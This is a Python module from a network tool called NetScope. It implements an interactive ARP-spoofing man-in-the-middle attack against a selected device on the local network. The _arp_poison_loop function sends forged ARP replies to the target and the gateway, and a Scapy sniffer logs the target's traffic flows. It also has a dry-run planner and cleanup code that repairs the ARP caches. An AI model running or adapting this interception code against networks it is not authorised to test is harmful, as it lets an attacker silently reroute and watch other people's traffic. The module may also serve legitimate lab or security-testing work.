from __future__ import annotations

import ipaddress
import subprocess
import threading
import time
from datetime import datetime
from typing import Optional, List

from .inventory import (
    InterfaceIPv4,
    DeviceInfo,
    list_candidate_interfaces,
    load_inventory_snapshot_for_iface,
)
from .safety import build_mitm_plan, MitmSafetyPlan, IpForwardingManager


# ---------------------------------------------------------------------------
# Helpers: MAC normalization, display, gateway, ARP cache
# ---------------------------------------------------------------------------


def _normalize_mac(mac: Optional[str]) -> Optional[str]:
    """Normalize MAC addresses to colon-separated lowercase format.

    Examples:
      'AA-BB-CC-DD-EE-FF' -> 'aa:bb:cc:dd:ee:ff'
      'aa:bb:cc:dd:ee:ff' -> 'aa:bb:cc:dd:ee:ff'
    """
    if not mac:
        return None
    mac = mac.strip()
    # Convert Windows-style "AA-BB-CC-DD-EE-FF" to "aa:bb:cc:dd:ee:ff"
    mac = mac.replace("-", ":").lower()
    return mac


def _print_brief_devices(devices: List[DeviceInfo]) -> None:
    """Compact device list focused on IP + name + vendor."""
    if not devices:
        print("No devices discovered on this interface.")
        return

    print("\nDiscovered devices on this interface:")
    print("IP           Hostname/Vendor")
    print("-----------------------------")
    for d in devices:
        label = d.hostname or d.vendor or "-"
        print(f"{d.ip:<12} {label}")


def _guess_gateway_for_interface(iface: InterfaceIPv4) -> Optional[str]:
    """Best-effort detection of the default gateway for a given interface.

    Uses 'route print -4' and looks for a default route (0.0.0.0/0) whose
    Interface column matches this interface's IPv4 address.
    """
    try:
        result = subprocess.run(
            ["route", "print", "-4"],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            check=False,
        )
    except Exception:
        return None

    for line in result.stdout.splitlines():
        line = line.strip()
        if not line:
            continue

        # Expect lines like:
        # 0.0.0.0          0.0.0.0        10.0.0.1      10.0.0.36     25
        parts = line.split()
        if len(parts) < 4:
            continue

        dest, mask = parts[0], parts[1]
        if dest == "0.0.0.0" and mask == "0.0.0.0":
            gateway = parts[2]
            iface_ip = parts[3]
            if iface_ip == iface.ip:
                return gateway

    return None


def _arp_ips_on_interface(iface: InterfaceIPv4) -> list[str]:
    """List IPs from the OS ARP cache that belong to this interface's subnet.

    This is read-only and does not send any packets.
    """
    try:
        net = ipaddress.IPv4Network(f"{iface.ip}/{iface.netmask}", strict=False)
    except Exception:
        return []

    try:
        result = subprocess.run(
            ["arp", "-a"],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            check=False,
        )
    except Exception:
        return []

    ips: set[str] = set()

    for line in result.stdout.splitlines():
        line = line.strip()
        if not line:
            continue
        if line.lower().startswith("interface:") or "internet address" in line.lower():
            continue

        parts = line.split()
        if len(parts) < 2:
            continue

        ip_str = parts[0]
        try:
            ip_obj = ipaddress.IPv4Address(ip_str)
        except ipaddress.AddressValueError:
            continue

        if ip_obj in net:
            ips.add(ip_str)

    try:
        return sorted(ips, key=lambda s: ipaddress.IPv4Address(s))
    except Exception:
        return sorted(ips)


def _select_target_ip(iface: InterfaceIPv4) -> Optional[str]:
    """Pick a target IP using inventory snapshot (if available) + ARP cache.

    - If we have an inventory snapshot, we show IP + hostname/vendor.
    - We allow selection of any inventory IP (not just ARP-present).
    - ARP is still consulted to mark "currently in cache" with '*'.
    """
    devices, ts = load_inventory_snapshot_for_iface(iface)

    # Branch 1: we have a snapshot -> nice names
    if devices:
        human_ts = (
            datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
            if ts
            else "unknown time"
        )
        print(f"Using last inventory snapshot for this interface (taken {human_ts}).")
        _print_brief_devices(devices)

        inv_ips_set = {d.ip for d in devices}
        try:
            inv_ips_sorted = sorted(
                inv_ips_set, key=lambda ip: ipaddress.IPv4Address(ip)
            )
        except Exception:
            inv_ips_sorted = sorted(inv_ips_set)

        arp_ips_set = set(_arp_ips_on_interface(iface))

        items: list[tuple[str, str]] = []  # (ip, label)
        for ip in inv_ips_sorted:
            label = "-"
            for d in devices:
                if d.ip == ip:
                    label = d.hostname or d.vendor or "-"
                    break
            items.append((ip, label))

        print("\nSelect target device:")
        for idx, (ip, label) in enumerate(items, start=1):
            alive_mark = "*" if ip in arp_ips_set else " "
            print(f"  {idx}. {ip:<12} {label} {alive_mark}")
        print("  q. cancel")
        print("\n(* = IP currently present in ARP cache)")

        while True:
            choice = input("\nEnter choice (number or IP, 'q' to cancel): ").strip()
            if choice.lower() in {"q", "quit", "exit"}:
                return None

            # Number choice
            if choice.isdigit():
                idx = int(choice)
                if 1 <= idx <= len(items):
                    return items[idx - 1][0]
                print("Invalid index, try again.")
                continue

            # IP choice
            try:
                ipaddress.IPv4Address(choice)
            except ipaddress.AddressValueError:
                print("Invalid IPv4 address format, try again.")
                continue

            if choice not in inv_ips_set:
                print(
                    "IP not found in discovered inventory. "
                    "Pick one from the list above (or rerun inventory if needed)."
                )
                continue
            return choice

    # Branch 2: no snapshot -> ARP-only list
    print(
        "No saved inventory snapshot for this interface. "
        "Run 'netscope inventory' first if you want hostnames/vendors here."
    )
    arp_ips = _arp_ips_on_interface(iface)
    if not arp_ips:
        print("No IPs found in ARP cache for this interface's subnet.")
        return None

    print("\nSelect target device (ARP cache only):")
    for idx, ip in enumerate(arp_ips, start=1):
        print(f"  {idx}. {ip}")
    print("  q. cancel")

    while True:
        choice = input("\nEnter choice (number or IP, 'q' to cancel): ").strip()
        if choice.lower() in {"q", "quit", "exit"}:
            return None

        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(arp_ips):
                return arp_ips[idx - 1]
            print("Invalid index, try again.")
            continue

        try:
            ipaddress.IPv4Address(choice)
        except ipaddress.AddressValueError:
            print("Invalid IPv4 address format, try again.")
            continue
        if choice not in arp_ips:
            print("IP not in the candidate list, please choose one of those.")
            continue
        return choice


# ---------------------------------------------------------------------------
# MITM plan description (dry run)
# ---------------------------------------------------------------------------


def _describe_mitm_plan(plan: MitmSafetyPlan) -> None:
    """Pretty-print what a future MITM session *would* do, without doing it."""
    print("\n=== NetScope MITM Dry-Run Plan ===\n")
    print(f"Interface : {plan.iface_name} (IP {plan.iface_ip})")
    print(f"Target    : {plan.target_ip}  MAC: {plan.target_mac or '-unknown-'}")
    print(f"Gateway   : {plan.gateway_ip}  MAC: {plan.gateway_mac or '-unknown-'}")

    if plan.ip_forwarding_enabled is True:
        fw_status = "enabled"
    elif plan.ip_forwarding_enabled is False:
        fw_status = "disabled"
    else:
        fw_status = "unknown"

    print(f"\nIPv4 forwarding on host: {fw_status}")

    print("\nIf you later enable active MITM, NetScope would:")
    print("  1. Ensure IPv4 forwarding is ENABLED on this host.")
    print(f"  2. Start sending forged ARP replies on {plan.iface_name}:")
    print(
        f"       - To {plan.target_ip}: claiming that {plan.gateway_ip} is at OUR MAC."
    )
    print(
        f"       - To {plan.gateway_ip}: claiming that {plan.target_ip} is at OUR MAC."
    )
    print(
        "     This makes the target's traffic to the internet flow through this host."
    )
    print("\nCurrent ARP table snapshot includes the following relevant entries:")
    rec_t = plan.arp_table_snapshot.get(plan.target_ip)
    rec_g = plan.arp_table_snapshot.get(plan.gateway_ip)
    if rec_t:
        print(f"  - Target : {rec_t.ip} -> {rec_t.mac}")
    else:
        print(f"  - Target : {plan.target_ip} not present in ARP cache yet.")
    if rec_g:
        print(f"  - Gateway: {rec_g.ip} -> {rec_g.mac}")
    else:
        print(f"  - Gateway: {plan.gateway_ip} not present in ARP cache yet.")

    print("\nNOTE: This is a DRY RUN.")
    print(
        "      No ARP packets have been sent and no system configuration was changed."
    )
    print(
        "      When/if we implement active MITM, this plan will be used as a blueprint."
    )
    print("==============================================")
    print()


# ---------------------------------------------------------------------------
# ARP poisoning + repair (active MITM)
# ---------------------------------------------------------------------------


def _arp_poison_loop(
    plan: MitmSafetyPlan,
    iface_name: str,
    our_mac: str,
    stop_event: threading.Event,
) -> None:
    """Continuously send ARP replies to poison target and gateway.

    This runs in a background thread and stops when stop_event is set.
    We deliberately use L3 send(ARP(...)) because this is what
    worked reliably in your environment earlier, even if Scapy
    complains about Ethernet details.
    """
    try:
        from scapy.all import ARP, send  # type: ignore[import-untyped]
    except Exception as exc:
        print(f"[NetScope] ARP poisoning not available (Scapy/Npcap issue): {exc}")
        return

    our_mac_norm = _normalize_mac(our_mac)

    target_ip = plan.target_ip
    gateway_ip = plan.gateway_ip

    print("[NetScope] ARP poisoning loop started (sending every ~2s).")
    while not stop_event.is_set():
        try:
            # Tell target: gateway_ip is at OUR MAC
            pkt_to_target = ARP(
                op=2,  # is-at
                psrc=gateway_ip,
                pdst=target_ip,
                hwsrc=our_mac_norm,
            )
            # Tell gateway: target_ip is at OUR MAC
            pkt_to_gateway = ARP(
                op=2,
                psrc=target_ip,
                pdst=gateway_ip,
                hwsrc=our_mac_norm,
            )

            send(pkt_to_target, verbose=False)
            send(pkt_to_gateway, verbose=False)
        except Exception as exc:
            print(f"[NetScope] Error while sending ARP poison packets: {exc}")
            break
        # Poison at a gentle rate to avoid flooding
        stop_event.wait(2.0)

    print("[NetScope] ARP poisoning loop exiting.")


def _repair_arp(plan: MitmSafetyPlan, iface_name: str) -> None:
    """Send corrective ARP replies to restore original mapping.

    This does NOT modify OS ARP tables directly; instead it sends a few
    'good' ARP replies so that target and gateway caches converge back
    to their legitimate MAC->IP mappings.
    """
    try:
        from scapy.all import ARP, send  # type: ignore[import-untyped]
    except Exception as exc:
        print(f"[NetScope] ARP repair not available (Scapy/Npcap issue): {exc}")
        return

    target_mac_norm = _normalize_mac(plan.target_mac)
    gateway_mac_norm = _normalize_mac(plan.gateway_mac)

    if not target_mac_norm or not gateway_mac_norm:
        print("[NetScope] Skipping ARP repair (missing or invalid MAC info).")
        return

    print("[NetScope] Sending ARP repair packets to target and gateway...")

    # Restore mapping: gateway_ip -> gateway_mac for target,
    # and target_ip -> target_mac for gateway.
    pkt_to_target = ARP(
        op=2,
        psrc=plan.gateway_ip,
        pdst=plan.target_ip,
        hwsrc=gateway_mac_norm,
    )
    pkt_to_gateway = ARP(
        op=2,
        psrc=plan.target_ip,
        pdst=plan.gateway_ip,
        hwsrc=target_mac_norm,
    )

    for _ in range(5):
        try:
            send(pkt_to_target, verbose=False)
            send(pkt_to_gateway, verbose=False)
        except Exception as exc:
            print(f"[NetScope] Error while sending ARP repair packets: {exc}")
            break
        time.sleep(0.5)

    print("[NetScope] ARP repair packets sent.")


# ---------------------------------------------------------------------------
# Traffic sniffing for MITM
# ---------------------------------------------------------------------------


def _sniff_target_traffic(
    target_ip: str,
    dns_mapper,
    stop_event: threading.Event,
    seen_remotes: set[str],
) -> None:
    """Sniff IP traffic involving the target and print unique flows.

    This runs in a background thread and stops when stop_event is set.
    We sniff on ALL interfaces (iface=None) because on Windows the
    friendly interface name (e.g. 'Wi-Fi') does not always match
    the capture adapter name used by Npcap/Scapy.
    """
    try:
        from scapy.all import sniff, IP, TCP, UDP  # type: ignore[import-untyped]
    except Exception as exc:
        print(f"[NetScope] Traffic sniffing not available (Scapy/Npcap issue): {exc}")
        return

    seen_flows: set[tuple[str, str, int | None, str]] = set()

    def _handle(pkt):
        if stop_event.is_set():
            return
        if IP not in pkt:
            return

        ip_layer = pkt[IP]
        src = ip_layer.src
        dst = ip_layer.dst

        # Only care about traffic where the target is either src or dst
        if src != target_ip and dst != target_ip:
            return

        proto = "other"
        sport: int | None = None
        dport: int | None = None

        if TCP in pkt:
            proto = "TCP"
            sport = pkt[TCP].sport
            dport = pkt[TCP].dport
        elif UDP in pkt:
            proto = "UDP"
            sport = pkt[UDP].sport
            dport = pkt[UDP].dport

        key = (src, dst, dport, proto)
        if key in seen_flows:
            return
        seen_flows.add(key)

        # Decide direction and remote endpoint
        if src == target_ip:
            direction = "->"
            remote_ip = dst
            remote_port = dport
        else:
            direction = "<-"
            remote_ip = src
            remote_port = sport

        seen_remotes.add(remote_ip)

        label = remote_ip
        if remote_port:
            label = f"{remote_ip}:{remote_port}"

        hostname = dns_mapper.lookup(remote_ip)
        if hostname:
            label = f"{label} ({hostname})"

        print(f"[MITM] {target_ip} {direction} {label} [{proto}]")

    def _stop_filter(_pkt) -> bool:
        return stop_event.is_set()

    print("[NetScope] Starting MITM traffic sniffer for target (all interfaces)...")
    try:
        sniff(
            iface=None,  # all capture-capable interfaces
            prn=_handle,
            stop_filter=_stop_filter,
            store=False,
        )
    except Exception as exc:
        print(f"[NetScope] Error while sniffing target traffic: {exc}")
    print("[NetScope] MITM traffic sniffer exiting.")


# ---------------------------------------------------------------------------
# Public: mitm-plan (dry run)
# ---------------------------------------------------------------------------


def run_mitm_plan() -> None:
    """Interactive MITM planner (dry run only, no changes)."""
    interfaces = list_candidate_interfaces()
    if not interfaces:
        print("No suitable IPv4 network interfaces found (Wi-Fi/Ethernet that are up).")
        return

    # Interface selection (same as inventory)
    if len(interfaces) == 1:
        iface = interfaces[0]
        print(f"Using interface: {iface.name} ({iface.ip}/{iface.netmask})")
    else:
        print("Interfaces found")
        print("----------------")
        for idx, iface in enumerate(interfaces, start=1):
            print(f"{idx}. {iface.name}  ({iface.ip}/{iface.netmask})")

        while True:
            choice = input(
                f"\nChoose interface [1-{len(interfaces)}] (or 'q' to cancel): "
            ).strip()
            if choice.lower() in {"q", "quit", "exit"}:
                print("MITM planning cancelled.")
                return
            try:
                idx = int(choice)
                if 1 <= idx <= len(interfaces):
                    iface = interfaces[idx - 1]
                    break
            except ValueError:
                pass
            print("Invalid choice, try again.")

        print(f"\nUsing interface: {iface.name} ({iface.ip}/{iface.netmask})")

    # Target selection
    target_ip = _select_target_ip(iface)
    if not target_ip:
        print("No target selected. Aborting MITM planning.")
        return

    gw_ip = _guess_gateway_for_interface(iface)
    if not gw_ip:
        print("\nCould not automatically determine default gateway for this interface.")
        manual = input("Enter gateway IP manually (or leave blank to cancel): ").strip()
        if not manual:
            print("MITM planning cancelled (no gateway provided).")
            return
        try:
            ipaddress.IPv4Address(manual)
        except ipaddress.AddressValueError:
            print("Invalid IPv4 address. MITM planning cancelled.")
            return
        gw_ip = manual

    # Build and show dry-run plan
    plan = build_mitm_plan(
        iface_name=iface.name,
        iface_ip=iface.ip,
        target_ip=target_ip,
        gateway_ip=gw_ip,
    )
    _describe_mitm_plan(plan)


# ---------------------------------------------------------------------------
# Public: mitm (active ARP MITM with safety)
# ---------------------------------------------------------------------------


def run_mitm_active() -> None:
    """Run active ARP MITM against a chosen target (with safety rails)."""
    interfaces = list_candidate_interfaces()
    if not interfaces:
        print("No suitable IPv4 network interfaces found (Wi-Fi/Ethernet that are up).")
        return

    # Choose interface (same as inventory/mitm-plan)
    if len(interfaces) == 1:
        iface = interfaces[0]
        print(f"Using interface: {iface.name} ({iface.ip}/{iface.netmask})")
    else:
        print("Interfaces found")
        print("----------------")
        for idx, iface in enumerate(interfaces, start=1):
            print(f"{idx}. {iface.name}  ({iface.ip}/{iface.netmask})")

        while True:
            choice = input(
                f"\nChoose interface [1-{len(interfaces)}] (or 'q' to cancel): "
            ).strip()
            if choice.lower() in {"q", "quit", "exit"}:
                print("Active MITM cancelled.")
                return
            try:
                idx = int(choice)
                if 1 <= idx <= len(interfaces):
                    iface = interfaces[idx - 1]
                    break
            except ValueError:
                pass
            print("Invalid choice, try again.")

        print(f"\nUsing interface: {iface.name} ({iface.ip}/{iface.netmask})")

    # Target selection (shared with mitm-plan)
    target_ip = _select_target_ip(iface)
    if not target_ip:
        print("No target selected. Aborting active MITM.")
        return

    gw_ip = _guess_gateway_for_interface(iface)
    if not gw_ip:
        print("\nCould not automatically determine default gateway for this interface.")
        manual = input("Enter gateway IP manually (or leave blank to cancel): ").strip()
        if not manual:
            print("Active MITM cancelled (no gateway provided).")
            return
        try:
            ipaddress.IPv4Address(manual)
        except ipaddress.AddressValueError:
            print("Invalid IPv4 address. Active MITM cancelled.")
            return
        gw_ip = manual

    # Sanity checks
    if target_ip == gw_ip:
        print(
            "[NetScope] Selected target IP is the gateway IP; "
            "MITM against the router itself is not supported here."
        )
        return

    if target_ip == iface.ip:
        print(
            "[NetScope] Selected target IP is this host's own IP; "
            "self-MITM is not supported."
        )
        return

    # Build plan (snapshot ARP + forwarding state)
    plan = build_mitm_plan(
        iface_name=iface.name,
        iface_ip=iface.ip,
        target_ip=target_ip,
        gateway_ip=gw_ip,
    )

    # Normalize MACs from ARP snapshot
    target_mac_norm = _normalize_mac(plan.target_mac)
    gateway_mac_norm = _normalize_mac(plan.gateway_mac)

    if not target_mac_norm or not gateway_mac_norm:
        print(
            "\n[NetScope] Missing or invalid target/gateway MAC in ARP cache.\n"
            "           Try pinging both from this host, then rerun 'netscope inventory' and 'netscope mitm-plan'."
        )
        return

    plan.target_mac = target_mac_norm
    plan.gateway_mac = gateway_mac_norm

    # Get our own MAC on that interface
    try:
        from scapy.all import get_if_hwaddr  # type: ignore[import-untyped]

        our_mac_raw = get_if_hwaddr(iface.name)
        our_mac = _normalize_mac(our_mac_raw)
        if not our_mac:
            print(
                f"[NetScope] Our MAC address '{our_mac_raw}' appears invalid; aborting."
            )
            return
    except Exception as exc:
        print(f"[NetScope] Could not determine our MAC address via Scapy: {exc}")
        return

    print("\n=== NetScope MITM Session ===")
    print(f"Interface : {plan.iface_name} (IP {plan.iface_ip}, MAC {our_mac})")
    print(f"Target    : {plan.target_ip}  MAC: {plan.target_mac or '-unknown-'}")
    print(f"Gateway   : {plan.gateway_ip}  MAC: {plan.gateway_mac or '-unknown-'}")

    # Manage IP forwarding
    ipf_mgr = IpForwardingManager.from_current()
    print(
        "\n[NetScope] Enabling IPv4 forwarding for this session (will restore on exit)..."
    )
    ipf_mgr.ensure_enabled()

    # Prepare threads and stop event
    stop_event = threading.Event()

    # DNS mapper + sniffer (reuse from capture.py)
    from .dnsmap import DnsMapper
    from .capture import start_dns_sniffer
    from .whois_enrich import WhoisEnricher

    dns_mapper = DnsMapper()
    whois = WhoisEnricher()
    start_dns_sniffer(dns_mapper=dns_mapper, iface=iface.name, stop_event=stop_event)

    seen_remotes: set[str] = set()

    poison_thread = threading.Thread(
        target=_arp_poison_loop,
        args=(plan, iface.name, our_mac, stop_event),
        daemon=True,
    )
    sniff_thread = threading.Thread(
        target=_sniff_target_traffic,
        args=(target_ip, dns_mapper, stop_event, seen_remotes),
        daemon=True,
    )

    poison_thread.start()
    sniff_thread.start()

    print(
        "\n[NetScope] Active MITM is now RUNNING."
        "\n          Target traffic should flow through this host."
        "\n          Press Ctrl+C to stop and restore network state."
    )

    try:
        while True:
            time.sleep(1.0)
    except KeyboardInterrupt:
        print("\n[NetScope] Stopping active MITM...")
    finally:
        stop_event.set()
        poison_thread.join(timeout=3.0)
        sniff_thread.join(timeout=3.0)
        _repair_arp(plan, iface.name)
        print("[NetScope] Restoring IPv4 forwarding state...")
        ipf_mgr.restore()
        time.sleep(0.5)

        if seen_remotes:
            print("\n=== Summary of remote hosts contacted by target ===")
            for ip in sorted(seen_remotes, key=lambda s: ipaddress.IPv4Address(s)):
                org = whois.lookup_org(ip) or "-"
                print(f"{ip:<15}  {org}")
        else:
            print("\nNo remote hosts were observed during this MITM session.")

        print("[NetScope] Active MITM session ended cleanly.")
